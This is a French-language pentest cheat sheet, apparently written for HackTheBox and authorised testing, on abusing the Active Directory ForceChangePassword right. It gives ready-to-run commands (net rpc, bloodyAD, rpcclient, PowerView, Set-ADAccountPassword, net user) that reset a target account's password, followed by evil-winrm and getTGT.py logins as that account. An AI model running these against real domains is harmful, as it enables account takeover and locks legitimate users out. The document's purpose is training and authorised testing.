`ForceChangePassword` est encore un principe différent — ici tu as le droit de **réinitialiser le mot de passe** d'un compte cible, **sans connaître son mot de passe actuel**. C'est l'un des droits ACL les plus simples et les plus puissants à exploiter.

## Le concept

Normalement, changer le mot de passe de quelqu'un nécessite soit d'être admin, soit de connaître l'ancien mot de passe. Le droit étendu `User-Force-Change-Password` (c'est son vrai nom AD) permet de contourner ça : tu poses un **nouveau mot de passe arbitraire** sur le compte cible, point final. Pas besoin de connaître l'ancien.

C'est différent de `GenericAll`/`GenericWrite` (qui donnent bien plus de contrôle sur l'objet) — `ForceChangePassword` est un droit **ciblé uniquement sur le changement de mot de passe**, rien d'autre.

## Pourquoi c'est intéressant

Si tu as ce droit sur un compte avec des privilèges intéressants (accès à une machine, membre d'un groupe sensible, etc.), tu prends simplement le contrôle total du compte en lui imposant un mot de passe que tu connais.

**Attention** : ça écrase le mot de passe existant → c'est bruyant / destructif, l'utilisateur légitime perd l'accès à son compte. Sur HTB pas de souci, en pentest réel il faut prévenir le client ou choisir un mot de passe temporaire à restaurer après.

## Commandes Linux

**Avec `impacket` (`changepasswd.py` ou via rpcclient)** :
```bash
net rpc password "<target_user>" "<NewPassword123!>" -U "<domain>/<user>%<password>" -S <dc_ip>
```

**Avec `bloodyAD`** :
```bash
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<password>' set password <target_user> '<NewPassword123!>'
```

**Avec `rpcclient`** :
```bash
rpcclient -U "<domain>/<user>%<password>" <dc_ip> -c "setuserinfo2 <target_user> 23 '<NewPassword123!>'"
```

## Commandes Windows

**Avec PowerView** :
```powershell
$cred = ConvertTo-SecureString '<NewPassword123!>' -AsPlainText -Force
Set-DomainUserPassword -Identity '<target_user>' -AccountPassword $cred -Credential $currentCred
```

**Avec le module AD natif** :
```powershell
$cred = ConvertTo-SecureString '<NewPassword123!>' -AsPlainText -Force
Set-ADAccountPassword -Identity '<target_user>' -NewPassword $cred -Reset
```

**Avec `net.exe`** (si session déjà authentifiée avec les bons droits) :
```cmd
net user <target_user> <NewPassword123!> /domain
```

## Après le changement

Tu t'authentifies directement avec le nouveau mot de passe :
```bash
evil-winrm -i <target_ip> -u '<target_user>' -p '<NewPassword123!>'
```
ou pour valider que ça a marché côté Kerberos :
```bash
getTGT.py <domain>/<target_user>:'<NewPassword123!>'
```
